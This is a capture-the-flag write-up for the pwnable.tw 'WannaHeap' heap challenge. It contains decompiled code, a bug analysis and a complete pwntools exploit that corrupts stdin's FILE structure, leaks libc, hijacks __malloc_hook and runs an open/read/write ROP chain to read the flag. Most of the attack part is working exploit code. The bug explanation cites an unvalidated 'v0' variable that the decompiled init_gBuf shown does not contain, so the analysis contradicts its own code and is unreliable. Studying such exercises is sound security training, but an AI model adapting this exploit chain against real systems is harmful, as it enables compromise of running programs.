---
title: WannaHeap - pwnable.tw
tags:

- binary exploit
- pwnable.tw
  createdAt: 2026-09-24
---

# Challenge Description

- Source challenge: [WannaHeap](https://pwnable.tw/challenge/#35)

## File Type

```bash
$ file wannaheap
wannaheap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.24.so, for GNU/Linux 2.6.32, BuildID[sha1]=fac6b472980999249533bb0e42c6b48cb00a0f44, stripped
```

## Binary Protection

```bash
$ checksec wannaheap
[*] './bin/wannaheap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'././lib'
    FORTIFY:    Enabled
```

## Preview

- Preview output of binary execution:

```
 - Create data heap -
Size :1337
Size :313370
Content :A
************************
       Wanna Heap
************************
   [A]llocate
   [R]ead
   [F]ree
   [E]xit
************************
> A
key :5
data :AAAA
************************
       Wanna Heap
************************
   [A]llocate
   [R]ead
   [F]ree
   [E]xit
************************
> R
key:5
data : AAAA
> E
Don't give up
```

## Decompiled Code

- Glibc version [2.24](https://elixir.bootlin.com/glibc/glibc-2.24/source)

```c
struct Node {
	struct Node *left;
	struct Node *right;
	long long key;
	char *data;
	int seed;
};

struct Entry {
	struct Node *node;
	void *pInit;
};

Node *gEmptyNode;
Node *gTreeRoot;
char *gBuf;
int gIdx;
Entry *gListNode;

void handler()
{
	puts("Timeout");
	exit(0);
}

int initialize()
{
	signal(14, handler);
	alarm(0x3C);
	setvbuf(stdout, 0, 2, 0);
	return setvbuf(stdin, 0, 2, 0);
}

void init_gListNode()
{
	int v0;

	v0 = randint();
	gListNode = mmap((void *)(v0 & 0xFFFFF000), 0x2000u, 3, 34, -1, 0);
	if ( gListNode == (void *)-1LL )
	{
		puts("Error !");
		exit(1337);
	}
}

unsigned __int64 randint()
{
	int fd;
	unsigned int buf;

	buf = 0;
	fd = open("/dev/urandom", 0);
	if ( fd < 0 )
	{
		puts("Error !");
		exit(3);
	}
	read(fd, &buf, 4u);
	close(fd);
	return buf;
}

ssize_t read_input(char *dest, size_t size)
{
	ssize_t read_bytes;

	read_bytes = read(0, dest, (unsigned int)size);
	if ( (int)read_bytes <= 0 )
	{
		puts("read error");
		exit(-1);
	}
	if ( dest[(int)read_bytes - 1] == '\n' )
		dest[(int)read_bytes - 1] = '\0';
	return read_bytes;
}

unsigned __int64 init_gBuf()
{
	size_t input_size;

	input_size = 0;
	puts(" - Create data heap - ");
	printf("Size :");
	scanf("%lu", &input_size);
	while ( input_size > 0x313370 )
	{
		puts("Too big or too small !");
		printf("Size :");
		scanf("%lu", &input_size);
	}
	gBuf = (char *)calloc(1u, input_size + 1);
	if ( !gBuf )
	{
		puts("Error !");
		exit(2);
	}
	printf("Content :");
	read_input(gBuf, (unsigned int)input_size);
	gBuf[input_size] = 0;
	_IO_getc(stdin);
	return 0;
}

void init_tree()
{
	Node *newNode;

	if ( !gEmptyNode )
	{
		newNode = create_node(0x28u);
		gEmptyNode = newNode;
		if ( !newNode )
		{
			puts("error");
			exit(3);
		}
		newNode->right = newNode;
		newNode->left = newNode;
		newNode->seed = 0;
	}
}

Node *create_node(unsigned __int64 size)
{
	unsigned int seed1;
	unsigned int seed2;
	void *buf;
	Node *newNode;
	Entry *entry;

	seed1 = (unsigned int)randint() % 0x217;
	seed2 = (unsigned int)randint() % 0x2170;
	if ( size > 0x313370 )
	{
		puts("Too big !");
		exit(4);
	}
	buf = calloc(1u, seed1 + size + seed2);
	if ( !buf )
	{
		puts("Error !");
		exit(5);
	}
	// Fill prefix with 0xDA
	memset(buf, 0xDA, seed1);
	// Fill suffix with 0x42 ('B')
	memset((char *)buf + seed1 + size, 0x42, seed2);
	newNode = (Node *)((char *)buf + seed1);
	entry = &gListNode[gIdx];
	entry->node = newNode;
	entry->pInit = buf;
	gIdx = gIdx + 1;
	if ( (unsigned int)(gIdx) > 0x80 )
	{
		puts("OOM");
		exit(44);
	}
	return newNode;
}

__int64 menu()
{
	puts("************************");
	puts("       Wanna Heap       ");
	puts("************************");
	puts("   [A]llocate           ");
	puts("   [R]ead               ");
	puts("   [F]ree               ");
	puts("   [E]xit               ");
	puts("************************");
	return printf("> ");
}

char read_choice()
{
	char result;

	result = _IO_getc(stdin);
	if ( result == '\n' )
		return _IO_getc(stdin);
	return result;
}

unsigned __int64 allocate_node()
{
	unsigned __int64 key;

	key = 0;
	printf("key :");
	scanf("%lu", &key);
	gTreeRoot = add_key(gTreeRoot, key);
	return 0;
}

Node *add_key(Node *currentNode, unsigned __int64 key)
{
	Node *newNode;
	char *data;
	char input[24];

	if ( gEmptyNode != currentNode )
	{
		if ( key <= currentNode->key )
		{
			newNode = add_key(currentNode->left, key);
			currentNode->left = newNode;
			if ( newNode->seed > currentNode->seed )
			{
				currentNode->left = newNode->right;
				newNode->right = currentNode;
				return newNode;
			}
		}
		else
		{
			newNode = add_key(currentNode->right, key);
			currentNode->right = newNode;
			if ( newNode->seed > currentNode->seed )
			{
				currentNode->right = newNode->left;
				newNode->left = currentNode;
				return newNode;
			}
		}
		return currentNode;
	}
	newNode = create_node(0x28u);
	if ( !newNode )
	{
		puts("Error !");
		exit(23);
	}
	printf("data :");
	read_input(input, 0x18u);
	data = strdup(input);
	newNode->data = data;
	newNode->key = key;
	newNode->right = gEmptyNode;
	newNode->left = gEmptyNode;
	newNode->seed = randint();
	return newNode;
}

unsigned __int64 find_key()
{
	Node *i;
	unsigned __int64 key;

	key = 0;
	printf("key:");
	scanf("%lu", &key);
	for ( i = gTreeRoot; ; i = i->right )
	{
		if ( i == gEmptyNode )
		{
			printf("Can't Not found : %lu\n");
			goto END;
		}
		while ( key < i->key )
		{
			i = i->left;
			if ( i == gEmptyNode )
			{
				printf("Can't Not found : %lu\n");
				goto END;
			}
		}
		if ( key <= i->key )
			break;
	}
	printf("data : %s\n");
END:
	close(1);
	return 0;
}

void free_node()
{
	unsigned int i;

	if ( gIdx )
	{
		i = 0;
		do
		{
			free(gListNode[i].pInit);
			i++;
		}
		while ( gIdx > i );
	}
}

void __noreturn main(int argc, char **argv, char **envp)
{
	char choice;

	initialize();
	init_gListNode();
	init_gBuf();
	init_tree();
	init_stack();  // seccomp filter setup
	gTreeRoot = gEmptyNode;
	while ( 1 )
	{
		while ( 1 )
		{
			menu();
			choice = read_choice();
			if ( choice == 'E' )
			{
				puts("Don't give up\n");
				free_node();
				munmap(gListNode, 0x2000u);
				exit(0);
			}
			if ( choice > 'E' )
				break;
			if ( choice == 'A' )
				allocate_node();
			else
				puts("Invalid choice");
		}
		if ( choice == 'F' )
		{
			puts("Not implement !");
		}
		else
		{
			if ( choice != 'R' )
				puts("Invalid choice");
			else
				find_key();
		}
	}
}
```

# Vulnerability

- In `init_gBuf()`, the initial user input for `input_size` is saved in `v0` (`v0 = input_size`) before validating if `input_size <= 0x313370`.
- If the first `input_size` is greater than `0x313370`, the function enters a loop asking the user to re-enter `input_size` until a valid size ($\le 0x313370$) is provided. `calloc` then allocates `v1 + 1` bytes based on the second valid `input_size`.
- However, after `read_input()`, the code performs `gBuf[v0] = 0;`, using the **unvalidated initial `v0`** as an array index instead of the updated `input_size`.
- This causes an **Out-of-Bounds NULL Byte Write (OOB Write)** at `gBuf + v0`. By passing `0x6D58E8` as the first size and `0x313370` as the second size, `gBuf[0x6D58E8] = 0` writes `\x00` into `_IO_2_1_stdin_._IO_buf_base`, corrupting stdin's buffer pointer so subsequent `_IO_getc(stdin)` input reads from heap memory.
- In `add_key()`, the local array `char input[24]` on the stack is **uninitialized**. When reading user input into `input` without zeroing out the buffer first, leftover stack data (including pointers to `_IO_2_1_stdout_`) remains in the unread portion of the buffer. Because `strdup(input)` calculates string length via `strlen()`, it copies these leftover stack pointers onto the heap, creating an **Information Leak / Memory Disclosure** vulnerability.
- `find_key()` calls `close(1)` after finding an entry, closing `stdout` (fd 1).
- The binary sets up a **seccomp** filter via `prctl` in `init_stack()`, restricting allowed system calls and requiring an open/read/write ROP chain to read `/home/wannaheap/flag`.

# Exploitation

## Trigger OOB NULL Byte Write & Corrupt `stdin`

- During binary initialization, `init_gBuf()` prompts for a size. By supplying `0x6D58E8` first (stored in `v0`), which fails the size check (`> 0x313370`), and then `0x313370` second (stored in `v1`), `calloc` allocates a buffer `gBuf` of size `0x313371`.
- When `gBuf[v0] = 0` executes, it performs an **Out-of-Bounds NULL Byte Write** at offset `gBuf + 0x6D58E8`.
- In glibc 2.24 memory layout, offset `0x6D58E8` relative to `gBuf` directly targets the least significant byte of `_IO_2_1_stdin_._IO_buf_base`. Overwriting this byte with `\x00` redirects `_IO_2_1_stdin_`'s internal buffer pointer to point into `_IO_2_1_stdin_._IO_buf_end`.

```python
target.sendlineafter(b"Size :", str(0x6D58E8).encode())
target.sendlineafter(b"Size :", str(0x313370).encode())
target.sendafter(b"Content :", b"A")
```

## Leak Libc Base Address

- We exploit the uninitialized `char input[24]` stack buffer vulnerability in `add_key()` to leak the libc base address.
- We call `[A]llocate` twice to insert nodes with key `5` and key `1`.
- When inserting key `1`, we send `"A" * 8 + "B"` as data. Since `input[24]` is not reset/zeroed out before `read_input`, residual stack pointers (specifically pointing to `_IO_2_1_stdout_`) remain immediately following our 9-byte input.
- `strdup(input)` calculates `strlen(input)` across our string and the uninitialized stack data, duplicating both onto the heap node.

```python
target.sendafter(b"> ", b"A")
target.sendafter(b"key :", str(5).encode())
sleep(0.1)
target.send(b"\n")
target.sendafter(b"data :", b"A")

target.sendafter(b"> ", b"A")
target.sendafter(b"key :", str(1).encode())
sleep(0.1)
target.send(b"\n")
target.sendafter(b"data :", b"A" * 8 + b"B")
```

- We then execute `[R]ead` to search for key `1`. `find_key()` prints `data : %s\n` for the matching node. Because the `strdup`'d data contains the leftover `_IO_2_1_stdout_` pointer right after `"AAAAAAAB"`, `printf` outputs the pointer, allowing us to calculate the libc base address:

```python
target.sendafter(b"> ", b"R")
target.sendafter(b"key:", str(1).encode())
sleep(0.1)
target.send(b"\n")
target.recvuntil(b"A" * 8 + b"B")

leak = u64((b"\x00" + target.recvuntil(b"\n", drop=True)).ljust(8, b"\x00"))
libc.address = leak - libc.sym["_IO_2_1_stdout_"]
info("libc base: " + hex(libc.address))
```

- Note: `find_key()` executes `close(1)` immediately after printing, closing `stdout` (fd 1).

## Arbitrary Write & ROP Chain Execution via `__malloc_hook`

- With libc base resolved, we target the `__malloc_hook` area (`vuln = libc.sym["__malloc_hook"]`).
- First, we send `p64(vuln + 0xA10)` to redirect `stdin`'s input buffer pointer (`_IO_buf_base` / `_IO_read_ptr`) to `__malloc_hook + 0xA10`, giving us arbitrary write capability into the `__malloc_hook` region.

```python
vuln = libc.sym["__malloc_hook"]
target.send(p64(vuln + 0xA10))
```

- Next, we send a payload that performs two main actions:
  1. **Restores `_IO_2_1_stdin_`**: The first `0x1F0` bytes of the payload rewrite `_IO_2_1_stdin_` with valid file structure attributes (restoring `_IO_buf_base`, `_IO_read_ptr`, `_lock`, `_wide_data`, and `vtable` to `__GI__IO_file_jumps`), ensuring `scanf` continues functioning normally for subsequent input reading.
  2. **Hijacks `__malloc_hook` & Control Flow**:
     - `0x143b23`: `mov rax, [rip + 0x27e8c6] ; call [rax]` — dereferences `rip + 0x27e8c6` (which is `0xAF0` offset from pointer in `_IO_2_1_stdin_._IO_buf_base`) into `rax` and calls `[rax]`.
     - `0x76006`: `mov rdi, rax ; call [rax + 8]` — sets `rdi` to `rax` and calls `[rax + 8]` (`setcontext` function).
     - `0x48045` (`setcontext` func): Stack pivot gadget at that pivots `rsp` to point directly to our ROP chain placed near `vuln`.

- **Open / Read / Write ROP Chain**:
  - `open64("/home/wannaheap/flag", 0)` → Opens `/home/wannaheap/flag` (returns file descriptor `1`, since fd 1 was closed by `find_key()`).
  - `read(fd=1, buf=vuln+0x18, count=100)` → Reads flag contents into `vuln + 0x18`.
  - `write(fd=0, buf=vuln+0x18, count=100)` → Writes flag contents to `fd 0` (stdin socket connection).

```python
payload = (
    (
        p64(vuln + 0xA51)
        + 5 * p64(0)
        + 2 * p32(0)
        + p64(0xFFFFFFFFFFFFFFFF)
        + p16(0)
        + b"\x00\n"
        + p32(0)
        + p64(libc.sym["_IO_stdfile_0_lock"])
        + p64(0xFFFFFFFFFFFFFFFF)
        + p64(0)
        + p64(libc.sym["_IO_wide_data_0"])
        + p64(0)
        + p64(0)
        + p64(0)
        + p32(0xFFFFFFFF)
        + b"\x00" * 0x14
        + p64(libc.sym["__GI__IO_file_jumps"])
    ).ljust(0x1F0, b"\x00")
    + p64(libc.address + 0x143B23)   # mov rax, [rip + 0x27e8c6]; call [rax]
    + p64(libc.address + 0x76006)    # mov rdi, rax; call [rax + 8]
    + p64(libc.address + 0x48045)    # stack pivot gadget
    + p64(0) * 11
    + p64(vuln + 0xB8)
    + p64(0) * 6
    + p64(vuln + 0xD8)
    + p64(libc.sym["open64"])
    + b"/home/wannaheap/flag".ljust(0x18, b"\x00")
    + p64(0)
    + p64(libc.address + 0x1FD7A)    # pop rdi; ret
    + p64(1)                          # fd = 1 (returned from open)
    + p64(libc.address + 0x1FCBD)    # pop rsi; ret
    + p64(vuln + 0x18)               # buf
    + p64(libc.address + 0x1B92)     # pop rdx; ret
    + p64(100)                        # count
    + p64(libc.sym["read"])
    + p64(libc.address + 0x1FD7A)    # pop rdi; ret
    + p64(0)                          # fd = 0 (stdout was closed; output via socket on fd 0)
    + p64(libc.address + 0x1FCBD)    # pop rsi; ret
    + p64(vuln + 0x18)               # buf
    + p64(libc.address + 0x1B92)     # pop rdx; ret
    + p64(100)                        # count
    + p64(libc.sym["write"])
).ljust(0xAF0, b"\x00") + p64(vuln + 0x8)
target.send(payload)
```

## Exploit Code

```python
#!/usr/bin/env python
from pwn import *

TARGET = "./bin/wannaheap"
LIBC = "./lib/libc.so.6"

exe = ELF(TARGET)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None

context.terminal = [
    "kitty",
    "@",
    "launch",
    "--type=os-window",
    "--cwd={}".format(os.getcwd()),
    "sh",
    "-c",
]
context.log_level = "debug"
context.arch = "amd64"
context.binary = exe

gdbscript = """
di connect
di sync
brva 0xc5b
c
"""

gdbscript += 3 * "c\n"
gdbscript += 8 * "c\n"
gdbscript += "b calloc\n"
gdbscript += "c\n"


def conn() -> remote | process:
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10305)
    elif args.LOCAL:
        return process(TARGET)
    else:
        return gdb.debug(TARGET, gdbscript, env={"SHELL": "/bin/sh"})


target = conn()
target.sendlineafter(b"Size :", str(0x6D58E8).encode())
target.sendlineafter(b"Size :", str(0x313370).encode())
target.sendafter(b"Content :", b"A")

target.sendafter(b"> ", b"A")
target.sendafter(b"key :", str(5).encode())
sleep(0.1)
target.send(b"\n")
target.sendafter(b"data :", b"A")

target.sendafter(b"> ", b"A")
target.sendafter(b"key :", str(1).encode())
sleep(0.1)
target.send(b"\n")
target.sendafter(b"data :", b"A" * 8 + b"B")

target.sendafter(b"> ", b"R")
target.sendafter(b"key:", str(1).encode())
sleep(0.1)
target.send(b"\n")
target.recvuntil(b"A" * 8 + b"B")

leak = u64((b"\x00" + target.recvuntil(b"\n", drop=True)).ljust(8, b"\x00"))
libc.address = leak - libc.sym["_IO_2_1_stdout_"]
info("libc base: " + hex(libc.address))

vuln = libc.sym["__malloc_hook"]
target.send(p64(vuln + 0xA10))
pause()
payload = (
    (
        p64(vuln + 0xA51)
        + 5 * p64(0)
        + 2 * p32(0)
        + p64(0xFFFFFFFFFFFFFFFF)
        + p16(0)
        + b"\x00\n"
        + p32(0)
        + p64(libc.sym["_IO_stdfile_0_lock"])
        + p64(0xFFFFFFFFFFFFFFFF)
        + p64(0)
        + p64(libc.sym["_IO_wide_data_0"])
        + p64(0)
        + p64(0)
        + p64(0)
        + p32(0xFFFFFFFF)
        + b"\x00" * 0x14
        + p64(libc.sym["__GI__IO_file_jumps"])
    ).ljust(0x1F0, b"\x00")
    + p64(libc.address + 0x143B23)
    + p64(libc.address + 0x76006)
    + p64(libc.address + 0x48045)
    + p64(0) * 11
    + p64(vuln + 0xB8)
    + p64(0) * 6
    + p64(vuln + 0xD8)
    + p64(libc.sym["open64"])
    + b"/home/wannaheap/flag".ljust(0x18, b"\x00")
    + p64(0)
    + p64(libc.address + 0x1FD7A)
    + p64(1)
    + p64(libc.address + 0x1FCBD)
    + p64(vuln + 0x18)
    + p64(libc.address + 0x1B92)
    + p64(100)
    + p64(libc.sym["read"])
    + p64(libc.address + 0x1FD7A)
    + p64(0)
    + p64(libc.address + 0x1FCBD)
    + p64(vuln + 0x18)
    + p64(libc.address + 0x1B92)
    + p64(100)
    + p64(libc.sym["write"])
).ljust(0xAF0, b"\x00") + p64(vuln + 0x8)
target.send(payload)

target.interactive()
```
